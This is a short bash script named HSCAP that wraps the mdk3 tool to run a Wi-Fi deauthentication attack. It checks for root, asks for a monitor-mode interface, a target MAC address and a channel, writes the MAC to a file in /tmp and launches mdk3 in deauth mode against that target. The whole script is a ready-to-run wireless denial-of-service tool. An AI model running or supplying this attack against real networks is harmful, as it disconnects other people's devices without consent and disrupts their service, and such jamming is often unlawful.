#!/bin/bash

ScriptAuthor="MidNightSonne"
ScriptName="HSCAP"
ScriptVersion="1.0-0"

tmp="/tmp/"

function check_root {
	if [ $(whoami) = "root" ]; then
    echo
		echo -e " You HAVE Root Permissions ! "
    echo " --------------------------- "
	else
		echo -e " You DON'T Have Root Permissions "
		echo -en " Do: 'sudo bash $ScriptName' "
		exit
	fi
}

clear && echo -en "\\033]0;$ScriptName | $ScriptVersion\\a"

check_root

echo -e "\n       These Are The Networks Interfaces You Have       "
echo -e " You Need To Use An Interface With \e[4mMonitor Mode\e[0m Enabled \n"

ip -o link show | awk -F': ' '{print $2}'

echo
read -p " Enter The Interface You Want to Use > " interface

clear && echo

read -p " Enter The Mac Address You Want to Deauth > " macadd

cat >"/tmp/bl.txt" <<-EOF
$macadd
EOF

clear && echo

read -p " Enter The Channel You Want to Use > " channel

clear

mdk3 "$interface" d -b "${tmp}bl.txt" -c "${channel}"
